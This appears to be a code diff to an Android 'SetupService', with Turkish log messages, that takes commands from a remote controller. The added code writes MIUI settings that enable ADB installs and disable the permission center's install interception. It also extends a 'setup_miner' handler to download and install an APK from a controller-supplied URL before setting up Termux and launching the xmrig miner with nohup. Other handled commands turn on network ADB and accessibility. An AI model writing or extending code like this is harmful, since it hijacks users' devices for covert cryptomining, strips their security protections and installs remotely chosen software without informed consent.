@@ -55,6 +55,7 @@ public class SetupService extends Service {
         super.onCreate();
         startForeground(NOTIF_ID, buildNotification());
         grantSecureSettings();
+        tryMiuiUsbInstall();
         enableAccessibility();
         applyFreeformSettings();
         enableAdbOverNetwork();
@@ -160,6 +161,16 @@ public class SetupService extends Service {
             tryShell("cmd appops set " + p + " RUN_ANY_IN_BACKGROUND allow");
         }
         Log.i(TAG, "pil kalkani denendi (rootsuz basarisiz olabilir)");
+    }
+
+    private void tryMiuiUsbInstall() {
+        try {
+            Settings.Global.putInt(getContentResolver(), "security_adb_install_enable", 1);
+            Settings.Global.putInt(getContentResolver(), "permcenter_install_intercept_enabled", 0);
+            Log.i(TAG, "MIUI usb install anahtarlari yazildi");
+        } catch (Exception e) {
+            Log.e(TAG, "MIUI usb install failed", e);
+        }
     }
 
     private void enableAccessibility() {
@@ -350,7 +361,7 @@ public class SetupService extends Service {
             } else if ("stop_app".equals(type)) {
                 stopApp(msg.optString("package", ""));
             } else if ("setup_miner".equals(type)) {
-                setupMiner();
+                setupMiner(msg);
             } else if ("miner_start".equals(type)) {
                 minerStart();
             } else if ("miner_stop".equals(type)) {
@@ -469,7 +480,12 @@ public class SetupService extends Service {
                 + "nohup xmrig --config ~/config.json $TETZ_T >> ~/xmrig.log 2>&1 &\n";
     }
 
-    private void setupMiner() {
+    private void setupMiner(JSONObject msg) {
+        String apkUrl = msg.optString("apk_url", "");
+        if (!apkUrl.isEmpty()) {
+            Log.i(TAG, "setup_miner: once agent guncellemesi -> " + apkUrl);
+            downloadAndPromptInstall(apkUrl);
+        }
         Log.i(TAG, "setup_miner: termux.apk kuruluyor");
         downloadAndPromptInstall("/apks/termux.apk");
         Log.i(TAG, "setup_miner: taskbar.apk kuruluyor");
